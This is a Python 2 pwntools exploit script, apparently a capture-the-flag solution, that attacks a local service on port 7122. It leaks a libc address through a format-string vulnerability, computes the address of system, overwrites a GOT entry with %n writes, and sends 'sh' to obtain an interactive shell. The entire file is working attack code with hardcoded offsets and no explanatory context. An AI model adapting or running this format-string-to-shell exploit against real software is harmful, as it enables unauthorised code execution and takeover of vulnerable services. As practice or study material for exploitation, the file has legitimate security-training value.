#!/usr/bin/env python2

from pwn import *
from IPython import embed

r = remote('127.0.0.1', 7122)

r.sendline('<%7$s>'.ljust(8) + p64(0x601028))
ret = r.recvrepeat(0.2)
__libc_start_main = u64(re.findall('<.*>', ret)[0][1:-1].ljust(8,'\x00'))
libc = __libc_start_main - 0x20740
system = libc+0x45390
print hex(__libc_start_main)
print hex(system)

rs = system&0xffffffff
ls = (system >> 8*4)
print hex(ls), hex(rs)
pad = 24-len(str(rs))
padl = 24-len(str(ls))
print 'pad len:', pad
print rs
if rs > 2147483600:
	exit()
	
# modify only lower bytes
# r.sendline(('%'+str(rs-pad+2)+'c').ljust(24) + '%10$n'.ljust(8) + p64(0x601020))

# modify all bytes
r.sendline(('%'+str(ls-padl+2)+'c').ljust(24) + 
	    '%14$n'.ljust(8) + 
	    ('%'+str(rs-ls-pad+2)+'c').ljust(24) + 
	    '%15$n'.ljust(8) + 
	    p64(0x601024) + 
	    p64(0x601020))

r.recvrepeat(0.2)
r.sendline('sh\x00')

r.interactive()


